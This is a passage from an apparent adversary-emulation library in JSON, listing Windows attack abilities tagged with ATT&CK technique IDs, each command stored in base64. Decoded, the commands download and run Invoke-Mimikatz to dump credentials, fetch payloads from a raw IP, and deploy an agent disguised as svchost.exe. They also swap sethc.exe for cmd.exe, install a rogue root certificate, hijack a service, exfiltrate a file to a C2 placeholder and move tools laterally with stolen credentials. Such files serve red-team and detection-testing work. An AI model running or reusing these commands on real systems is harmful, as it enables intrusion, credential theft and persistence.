bitsdamin to run an executable.\nThis has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of \"svchost.exe\" and an Initiating Process Command Line of \"svchost.exe -k netsvcs -p -s BITS\"\nThis job will remain in the BITS queue until complete or for up to 90 days by default if not removed.\n", "variations": []}, {"test": "ZWNobyB2YXIgdXJsID0gImh0dHBzOi8vMTI4LjMwLjUyLjEwMC9UUi9QTkcvaXNvXzg4NTktMS50eHQiLCBmc28gPSBXU2NyaXB0LkNyZWF0ZU9iamVjdCgnU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QnKSwgcmVxdWVzdCwgc3RyZWFtOyByZXF1ZXN0ID0gV1NjcmlwdC5DcmVhdGVPYmplY3QoJ01TWE1MMi5TZXJ2ZXJYTUxIVFRQJyk7IHJlcXVlc3Qub3BlbignR0VUJywgdXJsLCBmYWxzZSk7IHJlcXVlc3Quc2VuZCgpOyBpZiAocmVxdWVzdC5zdGF0dXMgPT09IDIwMCkge3N0cmVhbSA9IFdTY3JpcHQuQ3JlYXRlT2JqZWN0KCdBRE9EQi5TdHJlYW0nKTsgc3RyZWFtLk9wZW4oKTsgc3RyZWFtLlR5cGUgPSAxOyBzdHJlYW0uV3JpdGUocmVxdWVzdC5yZXNwb25zZUJvZHkpOyBzdHJlYW0uUG9zaXRpb24gPSAwOyBzdHJlYW0uU2F2ZVRvRmlsZShmaWxlbmFtZSwgMSk7IHN0cmVhbS5DbG9zZSgpO30gZWxzZSB7V1NjcmlwdC5RdWl0KDEpO31XU2NyaXB0LlF1aXQoMCk7ID4gJVRFTVAlXE9TVGFwR2V0LmpzICYmIGNzY3JpcHQgLy9FOkpzY3JpcHQgJVRFTVAlXE9TVGFwR2V0Lmpz", "ability_id": "522f3f35cd013e63830fa555495a0081", "technique_name": "User Execution: Malicious File", "additional_info": {}, "privilege": "", "technique_id": "T1204.002", "platform": "windows", "name": "OSTap Payload Download", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsICVURU1QJVxPU1RhcEdldC5qcyAvRiAvUSA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "Uses cscript //E:jscript to download a file\n", "variations": []}, {"test": "QWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uIEAnOyBwdWJsaWMgY2xhc3MgVGVzdCB7OyAgICAgcHVibGljIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykgezsgICAgICAgICBTeXN0ZW0uQ29uc29sZS5Xcml0ZUxpbmUoInR3ZWV0LCB0d2VldCIpOzsgICAgIH07IH07ICdAIC1PdXRwdXRBc3NlbWJseSAiJEVudjp3aW5kaXJcVGVtcFxzdmNob3N0LmV4ZSI7IDsgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIiRFbnY6d2luZGlyXFRlbXBcc3ZjaG9zdC5leGUi", "ability_id": "131ce77a48d6ab56106f694bcd7cc123", "technique_name": "Masquerading: Match Legitimate Name or Location", "additional_info": {}, "privilege": "", "technique_id": "T1036.005", "platform": "windows", "name": "Masquerade as a built-in system executable", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gLVBhdGggIiRFbnY6d2luZGlyXFRlbXBcc3ZjaG9zdC5leGUiIC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "Launch an executable that attempts to masquerade as a legitimate executable.\n", "variations": []}, {"test": "cmVnIGFkZCBIS0VZX0NVUlJFTlRfVVNFUlxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xFeHBsb3JlciAvdiBEaXNhYmxlTm90aWZpY2F0aW9uQ2VudGVyIC90IFJFR19EV09SRCAvZCAxIC9m", "ability_id": "8707aeb70a3782c1a0b893c1a1b68f6c", "technique_name": "Modify Registry", "additional_info": {}, "privilege": "", "technique_id": "T1112", "platform": "windows", "name": "Disable Windows Notification Center", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnIGRlbGV0ZSBIS0VZX0NVUlJFTlRfVVNFUlxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xFeHBsb3JlciAvdiBEaXNhYmxlTm90aWZpY2F0aW9uQ2VudGVyIC9mID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows notification center.\nSee how remcos rat abuse this technique- https://tccontre.blogspot.com/2020/01/remcos-rat-evading-windows-defender-av.html\n", "variations": []}, {"test": "TmV3LVBTU2Vzc2lvbiAtQ29tcHV0ZXJOYW1lICRlbnY6Q09NUFVURVJOQU1FOyBUZXN0LUNvbm5lY3Rpb24gJGVudjpDT01QVVRFUk5BTUU7IFNldC1Db250ZW50IC1QYXRoICRlbnY6VEVNUFxUMTA4Nl9Qb3dlclNoZWxsX1Nlc3Npb25fQ3JlYXRpb25fYW5kX1VzZSAtVmFsdWUgIlQxMDg2IFBvd2VyU2hlbGwgU2Vzc2lvbiBDcmVhdGlvbiBhbmQgVXNlIjsgR2V0LUNvbnRlbnQgLVBhdGggJGVudjpURU1QXFQxMDg2X1Bvd2VyU2hlbGxfU2Vzc2lvbl9DcmVhdGlvbl9hbmRfVXNlOyBSZW1vdmUtSXRlbSAtRm9yY2UgJGVudjpURU1QXFQxMDg2X1Bvd2VyU2hlbGxfU2Vzc2lvbl9DcmVhdGlvbl9hbmRfVXNl", "ability_id": "6dbada37ec09d7bb640deec0af59eaf5", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "PowerShell Session Creation and Use", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Connect to a remote powershell session and interact with the host.\nUpon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.\n", "variations": []}, {"test": "Y29weSBDOlxXaW5kb3dzXFN5c3RlbTMyXHNldGhjLmV4ZSBDOlxXaW5kb3dzXFN5c3RlbTMyXHNldGhjX2JhY2t1cC5leGUgJiYgdGFrZW93biAvRiBDOlxXaW5kb3dzXFN5c3RlbTMyXHNldGhjLmV4ZSAvQSAmJiBpY2FjbHMgQzpcV2luZG93c1xTeXN0ZW0zMlxzZXRoYy5leGUgL2dyYW50IEFkbWluaXN0cmF0b3JzOkYgL3QgJiYgY29weSAvWSBDOlxXaW5kb3dzXFN5c3RlbTMyXGNtZC5leGUgQzpcV2luZG93c1xTeXN0ZW0zMlxzZXRoYy5leGU=", "ability_id": "b8f51051d777b6edd62156957da1ce78", "technique_name": "Event Triggered Execution: Accessibility Features", "additional_info": {}, "privilege": "", "technique_id": "T1546.008", "platform": "windows", "name": "Replace binary of sticky keys", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["Y29weSAvWSBDOlxXaW5kb3dzXFN5c3RlbTMyXHNldGhjX2JhY2t1cC5leGUgQzpcV2luZG93c1xTeXN0ZW0zMlxzZXRoYy5leGU="], "executor": "cmd", "access": {}, "description": "Replace sticky keys binary (sethc.exe) with cmd.exe\n", "variations": []}, {"test": "Zm9yKCRpPTA7ICRpIC1sZSAje3F1ZXJ5X3ZvbHVtZX07ICRpKyspIHsgKEludm9rZS1XZWJSZXF1ZXN0ICIje2RvaF9zZXJ2ZXJ9P25hbWU9I3tzdWJkb21haW59LiQoR2V0LVJhbmRvbSAtTWluaW11bSAxIC1NYXhpbXVtIDk5OTk5OSkuI3tkb21haW59JnR5cGU9I3txdWVyeV90eXBlfSIgLVVzZUJhc2ljUGFyc2luZykuQ29udGVudCB9", "ability_id": "f4491df17637c686f9d5507780b217a5", "technique_name": "Protocol Tunneling", "additional_info": {}, "privilege": "", "technique_id": "T1572", "platform": "windows", "name": "DNS over HTTPS Large Query Volume", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This test simulates an infected host sending a large volume of DoH queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DoH queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n", "variations": []}, {"test": "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vUG93ZXJTaGVsbE1hZmlhL1Bvd2VyU3Bsb2l0L2Y2NTA1MjBjNGIxMDA0ZGFmOGIzZWMwODAwN2EwYjk0NWI5MTI1M2EvRXhmaWx0cmF0aW9uL0ludm9rZS1NaW1pa2F0ei5wczEnKTsgSW52b2tlLU1pbWlrYXR6IC1EdW1wQ3JlZHM=", "ability_id": "a5b60304de310c045db90d974dd0fce2", "technique_name": "OS Credential Dumping: LSASS Memory", "additional_info": {}, "privilege": "", "technique_id": "T1003.001", "platform": "windows", "name": "Powershell Mimikatz", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Dumps credentials from memory via Powershell by invoking a remote mimikatz script.\nIf Mimikatz runs successfully you will see several usernames and hashes output to the screen.\nCommon failures include seeing an \\\"access denied\\\" error which results when Anti-Virus blocks execution. \nOr, if you try to run the test without the required administrative privleges you will see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n", "variations": []}, {"test": "d21pYyBwcm9jZXNzIGxpc3QgL0ZPUk1BVDoiZTNlOWJhX3dtaWNzY3JpcHQueHNsIg==", "ability_id": "50fd14a080c6e8ed6455c1d2aa81cfe0", "technique_name": "XSL Script Processing", "additional_info": {}, "privilege": "", "technique_id": "T1220", "platform": "windows", "name": "WMIC bypass using local XSL file", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["e3e9ba_wmicscript.xsl"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Executes the code specified within a XSL script using a local payload.\n", "variations": []}, {"test": "JHNlcnZlcj0iaHR0cDovLzAuMC4wLjA6ODg4OCI7JHVybD0iJHNlcnZlci9maWxlL2Rvd25sb2FkIjskd2M9TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudDskd2MuSGVhZGVycy5hZGQoInBsYXRmb3JtIiwid2luZG93cyIpOyR3Yy5IZWFkZXJzLmFkZCgiZmlsZSIsInNhbmRjYXQuZ28iKTskZGF0YT0kd2MuRG93bmxvYWREYXRhKCR1cmwpOyRuYW1lPSR3Yy5SZXNwb25zZUhlYWRlcnNbIkNvbnRlbnQtRGlzcG9zaXRpb24iXS5TdWJzdHJpbmcoJHdjLlJlc3BvbnNlSGVhZGVyc1siQ29udGVudC1EaXNwb3NpdGlvbiJdLkluZGV4T2YoImZpbGVuYW1lPSIpKzkpLlJlcGxhY2UoImAiIiwiIik7Z2V0LXByb2Nlc3MgfCA/IHskXy5tb2R1bGVzLmZpbGVuYW1lIC1saWtlICJDOlxVc2Vyc1xQdWJsaWNcJG5hbWUuZXhlIn0gfCBzdG9wLXByb2Nlc3MgLWY7cm0gLWZvcmNlICJDOlxVc2Vyc1xQdWJsaWNcJG5hbWUuZXhlIiAtZWEgaWdub3JlO1tpby5maWxlXTo6V3JpdGVBbGxCeXRlcygiQzpcVXNlcnNcUHVibGljXCRuYW1lLmV4ZSIsJGRhdGEpIHwgT3V0LU51bGw7U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggQzpcVXNlcnNcUHVibGljXCRuYW1lLmV4ZSAtQXJndW1lbnRMaXN0ICItc2VydmVyICRzZXJ2ZXIgLWdyb3VwIHJlZCIgLVdpbmRvd1N0eWxlIGhpZGRlbjs=", "ability_id": "2f34977d-9558-4c12-abad-349716777c6b", "technique_name": "Ingress Tool Transfer", "additional_info": {}, "privilege": "", "technique_id": "T1105", "platform": "windows", "name": "54ndc47", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "A GoLang agent which communicates through the HTTP contact", "variations": [{"command": "JHNlcnZlcj0iaHR0cDovLzAuMC4wLjA6ODg4OCI7JHVybD0iJHNlcnZlci9maWxlL2Rvd25sb2FkIjskd2M9TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudDskd2MuSGVhZGVycy5hZGQoInBsYXRmb3JtIiwid2luZG93cyIpOyR3Yy5IZWFkZXJzLmFkZCgiZmlsZSIsInNhbmRjYXQuZ28iKTskd2MuSGVhZGVycy5hZGQoImdvY2F0LWV4dGVuc2lvbnMiLCJwcm94eV9odHRwIik7JHdjLkhlYWRlcnMuYWRkKCJpbmNsdWRlUHJveHlQZWVycyIsIkhUVFAiKTskZGF0YT0kd2MuRG93bmxvYWREYXRhKCR1cmwpOyRuYW1lPSR3Yy5SZXNwb25zZUhlYWRlcnNbIkNvbnRlbnQtRGlzcG9zaXRpb24iXS5TdWJzdHJpbmcoJHdjLlJlc3BvbnNlSGVhZGVyc1siQ29udGVudC1EaXNwb3NpdGlvbiJdLkluZGV4T2YoImZpbGVuYW1lPSIpKzkpLlJlcGxhY2UoImAiIiwiIik7Z2V0LXByb2Nlc3MgfCA/IHskXy5tb2R1bGVzLmZpbGVuYW1lIC1saWtlICJDOlxVc2Vyc1xQdWJsaWNcJG5hbWUuZXhlIn0gfCBzdG9wLXByb2Nlc3MgLWY7cm0gLWZvcmNlICJDOlxVc2Vyc1xQdWJsaWNcJG5hbWUuZXhlIiAtZWEgaWdub3JlO1tpby5maWxlXTo6V3JpdGVBbGxCeXRlcygiQzpcVXNlcnNcUHVibGljXCRuYW1lLmV4ZSIsJGRhdGEpIHwgT3V0LU51bGw7U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggQzpcVXNlcnNcUHVibGljXCRuYW1lLmV4ZSAtQXJndW1lbnRMaXN0ICItc2VydmVyICRzZXJ2ZXIgLWdyb3VwIHJlZCAtbGlzdGVuUDJQIC12IiAtV2luZG93U3R5bGUgaGlkZGVuOw==", "description": "Deploy as a P2P agent with known peers included in compiled agent"}]}, {"test": "JHVybD0iI3tzZXJ2ZXJ9L2ZpbGUvZG93bmxvYWQiOyR3Yz1OZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50OyR3Yy5IZWFkZXJzLmFkZCgicGxhdGZvcm0iLCJ3aW5kb3dzIik7JHdjLkhlYWRlcnMuYWRkKCJmaWxlIiwic2FuZGNhdC5nbyIpOyR3Yy5IZWFkZXJzLmFkZCgic2VydmVyIiwiI3tzZXJ2ZXJ9Iik7JHdjLkhlYWRlcnMuYWRkKCJkZWZhdWx0U2xlZXAiLCI2MCIpOyR3Yy5IZWFkZXJzLmFkZCgiZGVmYXVsdEdyb3VwIiwiYnlwYXNzZWRfdV9icm8iKTskZGF0YT0kd2MuRG93bmxvYWREYXRhKCR1cmwpOyRuYW1lPSR3Yy5SZXNwb25zZUhlYWRlcnNbIkNvbnRlbnQtRGlzcG9zaXRpb24iXS5TdWJzdHJpbmcoJHdjLlJlc3BvbnNlSGVhZGVyc1siQ29udGVudC1EaXNwb3NpdGlvbiJdLkluZGV4T2YoImZpbGVuYW1lPSIpKzkpLlJlcGxhY2UoImAiIiwiIik7W2lvLmZpbGVdOjpXcml0ZUFsbEJ5dGVzKCJDOlxVc2Vyc1xQdWJsaWNcJG5hbWUuZXhlIiwkZGF0YSk7LlxBa2FnaTY0LmV4ZSAzMiAiQzpcVXNlcnNcUHVibGljXCRuYW1lLmV4ZSAtc2VydmVyICN7c2VydmVyfSI=", "ability_id": "e99cce5c-cb7e-4a6e-8a09-1609a221b90a", "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "additional_info": {}, "privilege": "", "technique_id": "T1548.002", "platform": "windows", "name": "duser/osksupport DLL Hijack", "requirements": [], "tactic": "privilege-escalation", "buckets": ["privilege-escalation"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["Akagi64.exe"], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJBa2FnaTY0LmV4ZSI="], "executor": "psh", "access": {}, "description": "UIPI bypass with uiAccess application", "variations": []}, {"test": "JG93bmVycyA9IEB7fTtnd21pIHdpbjMyX3Byb2Nlc3MgfCUgeyRvd25lcnNbJF8uaGFuZGxlXSA9ICRfLmdldG93bmVyKCkudXNlcn07JHBzID0gZ2V0LXByb2Nlc3MgfCBzZWxlY3QgcHJvY2Vzc25hbWUsSWQsQHtsPSJPd25lciI7ZT17JG93bmVyc1skXy5pZC50b3N0cmluZygpXX19OyR2YWxpZCA9IGZvcmVhY2goJHAgaW4gJHBzKSB7IGlmKCRwLk93bmVyIC1lcSAkZW52OlVTRVJOQU1FIC1BbmQgJHAuUHJvY2Vzc05hbWUgLWVxICJzdmNob3N0IikgeyRwfSB9OyR2YWxpZCB8IENvbnZlcnRUby1Kc29u", "ability_id": "05cda6f6-2b1b-462e-bff1-845af94343f7", "technique_name": "Process Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1057", "platform": "windows", "name": "Discover injectable process", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.json", "relationships": [{"edge": "", "source": "host.process.id", "custom_parser_vals": {"json_key": "Id", "json_type": "int"}, "target": ""}]}], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Discovers processes that the current user has the ability to access and selects an injectable one", "variations": []}, {"test": "Y2VydHV0aWwgLWFkZHN0b3JlIG15ICRlbnY6VGVtcFxyb290Q0EyLmNlcg==", "ability_id": "07ccf6feceb31dbfe88602a05f00d8c2", "technique_name": "Subvert Trust Controls: Install Root Certificate", "additional_info": {}, "privilege": "", "technique_id": "T1553.004", "platform": "windows", "name": "Install root CA on Windows with certutil", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["dHJ5IHs7ICRjZXJ0ID0gSW1wb3J0LUNlcnRpZmljYXRlIC1GaWxlUGF0aCAkZW52OlRlbXBccm9vdENBMi5jZXIgLUNlcnRTdG9yZUxvY2F0aW9uIENlcnQ6XExvY2FsTWFjaGluZVxNeTsgR2V0LUNoaWxkSXRlbSBDZXJ0OlxMb2NhbE1hY2hpbmVcTXlcJCgkY2VydC5UaHVtYnByaW50KSAtRXJyb3JBY3Rpb24gSWdub3JlIHwgUmVtb3ZlLUl0ZW0gLUVycm9yQWN0aW9uIElnbm9yZTsgR2V0LUNoaWxkSXRlbSBDZXJ0OlxMb2NhbE1hY2hpbmVcUm9vdFwkKCRjZXJ0LlRodW1icHJpbnQpIC1FcnJvckFjdGlvbiBJZ25vcmUgfCBSZW1vdmUtSXRlbSAtRXJyb3JBY3Rpb24gSWdub3JlOyB9IGNhdGNoIHsgfQ=="], "executor": "psh", "access": {}, "description": "Creates a root CA with certutil\n", "variations": []}, {"test": "aWYoLW5vdCAoVGVzdC1QYXRoICRlbnY6VEVNUFxMaW5lTnVtYmVycy50eHQpKXsgOyAgIDEuLjEwMCB8IEZvckVhY2gtT2JqZWN0IHsgQWRkLUNvbnRlbnQgLVBhdGggJGVudjpURU1QXExpbmVOdW1iZXJzLnR4dCAtVmFsdWUgIlRoaXMgaXMgbGluZSAkXy4iIH07IH07IFtTeXN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpFeHBlY3QxMDBDb250aW51ZSA9ICRmYWxzZTsgJGZpbGVjb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJGVudjpURU1QXExpbmVOdW1iZXJzLnR4dDsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSBleGFtcGxlLmNvbSAtTWV0aG9kIFBPU1QgLUJvZHkgJGZpbGVjb250ZW50IC1EaXNhYmxlS2VlcEFsaXZl", "ability_id": "ac4d31cae06889fe70ed9464748c970a", "technique_name": "Exfiltration Over C2 Channel", "additional_info": {}, "privilege": "", "technique_id": "T1041", "platform": "windows", "name": "C2 Data Exfiltration", "requirements": [], "tactic": "exfiltration", "buckets": ["exfiltration"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Exfiltrates a file present on the victim machine to the C2 server.\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChpd3IgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDEyMDQuMDAyL3NyYy9JbnZva2UtTWFsRG9jLnBzMSIgLVVzZUJhc2ljUGFyc2luZyk7ICRtYWNyb2NvZGUgPSAiICAgT3BlbiBgIiQoIiRlbnY6dGVtcFxhcnQxMjA0LmJhdCIpYCIgRm9yIE91dHB1dCBBcyAjMWBuICAgV3JpdGUgIzEsIGAiY2FsYy5leGVgImBuICAgQ2xvc2UgIzFgbiAgIGEgPSBTaGVsbChgImNtZC5leGUgL2MgJGJhdF9wYXRoIGAiLCB2Yk5vcm1hbEZvY3VzKWBuIjsgSW52b2tlLU1hbERvYyAtbWFjcm9Db2RlICRtYWNyb2NvZGUgLW9mZmljZVByb2R1Y3QgV29yZA==", "ability_id": "d6f57d813245d0ec3940cb3c50ad2848", "technique_name": "User Execution: Malicious File", "additional_info": {}, "privilege": "", "technique_id": "T1204.002", "platform": "windows", "name": "Office launching .bat file from AppData", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Microsoft Office creating then launching a .bat script from an AppData directory. The .bat file launches calc.exe when opened.", "variations": []}, {"test": "KE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkRmlsZSgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbS9tYXN0ZXIvTElDRU5TRS50eHQiLCAiJGVudjpURU1QXEF0b21pYy1saWNlbnNlLnR4dCIp", "ability_id": "4f683658f161ccdc51337c470d32bab9", "technique_name": "Ingress Tool Transfer", "additional_info": {}, "privilege": "", "technique_id": "T1105", "platform": "windows", "name": "Windows - PowerShell Download", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gJGVudjpURU1QXEF0b21pYy1saWNlbnNlLnR4dCAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "This test uses PowerShell to download a payload.\nThis technique is used by multiple adversaries and malware families.\n", "variations": []}, {"test": "JGpvYiA9IFN0YXJ0LUpvYiAtU2NyaXB0QmxvY2sgeyAgJHVzZXJuYW1lID0gIiN7ZG9tYWluLnVzZXIubmFtZX0iOyAgJHBhc3N3b3JkID0gIiN7ZG9tYWluLnVzZXIucGFzc3dvcmR9IjsgICRzZWNzdHIgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uU2VjdXJpdHkuU2VjdXJlU3RyaW5nOyAgJHBhc3N3b3JkLlRvQ2hhckFycmF5KCkgfCBGb3JFYWNoLU9iamVjdCB7JHNlY3N0ci5BcHBlbmRDaGFyKCRfKX07ICAkY3JlZCA9IE5ldy1PYmplY3QgLVR5cGVuYW1lIFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsIC1Bcmd1bWVudGxpc3QgJHVzZXJuYW1lLCAkc2Vjc3RyOyAgJHNlc3Npb24gPSBOZXctUFNTZXNzaW9uIC1Db21wdXRlck5hbWUgIiN7cmVtb3RlLmhvc3QubmFtZX0iIC1DcmVkZW50aWFsICRjcmVkOyAgJGxvY2F0aW9uID0gIiN7bG9jYXRpb259IjsgICRleGUgPSAiI3tleGVfbmFtZX0iOyAgQ29weS1JdGVtICRsb2NhdGlvbiAtRGVzdGluYXRpb24gIkM6XFVzZXJzXFB1YmxpY1xzdmNob3N0LmV4ZSIgLVRvU2Vzc2lvbiAkc2Vzc2lvbjsgIFN0YXJ0LVNsZWVwIC1zIDU7ICBSZW1vdmUtUFNTZXNzaW9uIC1TZXNzaW9uICRzZXNzaW9uO307UmVjZWl2ZS1Kb2IgLUpvYiAkam9iIC1XYWl0Ow==", "ability_id": "4908fdc4-74fc-4d7c-8935-26d11ad26a8d", "technique_name": "Lateral Tool Transfer", "additional_info": {}, "privilege": "", "technique_id": "T1570", "platform": "windows", "name": "Copy 54ndc47 (WinRM and SCP)", "requirements": [], "tactic": "lateral-movement", "buckets": ["lateral-movement"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["sandcat.go-windows"], "cleanup": ["JGpvYiA9IFN0YXJ0LUpvYiAtU2NyaXB0QmxvY2sgewogICR1c2VybmFtZSA9ICIje2RvbWFpbi51c2VyLm5hbWV9IjsKICAkcGFzc3dvcmQgPSAiI3tkb21haW4udXNlci5wYXNzd29yZH0iOwogICRzZWNzdHIgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uU2VjdXJpdHkuU2VjdXJlU3RyaW5nOwogICRwYXNzd29yZC5Ub0NoYXJBcnJheSgpIHwgRm9yRWFjaC1PYmplY3QgeyRzZWNzdHIuQXBwZW5kQ2hhcigkXyl9OwogICRjcmVkID0gTmV3LU9iamVjdCAtVHlwZW5hbWUgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwgLUFyZ3VtZW50bGlzdCAkdXNlcm5hbWUsICRzZWNzdHI7CiAgJHNlc3Npb24gPSBOZXctUFNTZXNzaW9uIC1Db21wdXRlck5hbWUgIiN7cmVtb3RlLmhvc3QubmFtZX0iIC1DcmVkZW50aWFsICRjcmVkOwogIEludm9rZS1Db21tYW5kIC1TZXNzaW9uICRzZXNzaW9uIC1Db21tYW5kIHtSZW1vdmUtSXRlbSAiQzpcVXNlcnNcUHVibGljXHN2Y2hvc3QuZXhlIiAtZm9yY2V9OwogIFN0YXJ0LVNsZWVwIC1zIDU7CiAgUmVtb3ZlLVBTU2Vzc2lvbiAtU2Vzc2lvbiAkc2Vzc2lvbjsKfTsKUmVjZWl2ZS1Kb2IgLUpvYiAkam9iIC1XYWl0Ow==", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJzYW5kY2F0LmdvLXdpbmRvd3Mi"], "executor": "psh", "access": {}, "description": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP", "variations": []}, {"test": "cXVlcnkgdXNlciAvU0VSVkVSOiRlbnY6Q09NUFVURVJOQU1F", "ability_id": "64cd24a80d589eb938c6cbc03ed9d37b", "technique_name": "Account Discovery: Domain Account", "additional_info": {}, "privilege": "", "technique_id": "T1087.002", "platform": "windows", "name": "Enumerate logged on users via CMD (Domain)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Enumerate logged on users. Upon exeuction, logged on users will be displayed.\n", "variations": []}, {"test": "c2MgY29uZmlnIEZheCBiaW5QYXRoPSAiQzpcd2luZG93c1xzeXN0ZW0zMlxXaW5kb3dzUG93ZXJTaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlIC1ub2V4aXQgLWMgXCJ3cml0ZS1ob3N0ICdUMTU0My4wMDMgVGVzdCdcIiIgJiYgc2Mgc3RhcnQgRmF4", "ability_id": "50598e403dbf17cf341e4e08a9c5b0d1", "technique_name": "Create or Modify System Process: Windows Service", "additional_info": {}, "privilege": "", "technique_id": "T1543.003", "platform": "windows", "name": "Modify Fax service to run PowerShell", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["c2MgY29uZmlnIEZheCBiaW5QYXRoPSAiQzpcV0lORE9XU1xzeXN0ZW0zMlxmeHNzdmMuZXhlIiA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "This test will temporarily modify the service Fax by changing the binPath to PowerShell\nand will then revert the binPath change, restoring Fax to its original state.\nUpon successful execution, cmd will modify the binpath for `Fax` to spawn powershell. Powershell will then spawn.\n", "variations": []}, {"test": "JGVycm9yLmNsZWFyKCk7IEdldC1XbWlPYmplY3QgLVF1ZXJ5ICJTRUxFQ1QgKiBGUk9NIE1TQWNwaV9UaGVybWFsWm9uZVRlbXBlcmF0dXJlIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZTsgaWYoJGVycm9yKSB7ZWNobyAiVmlydHVhbGl6YXRpb24gRW52aXJvbm1lbnQgZGV0ZWN0ZWQifQ==", "ability_id": "e9e69b4fedb8e40d634865ce9a3192dc", "technique_name": "Virtualization/Sandbox Evasion: System Checks", "additional_info": {}, "privilege": "", 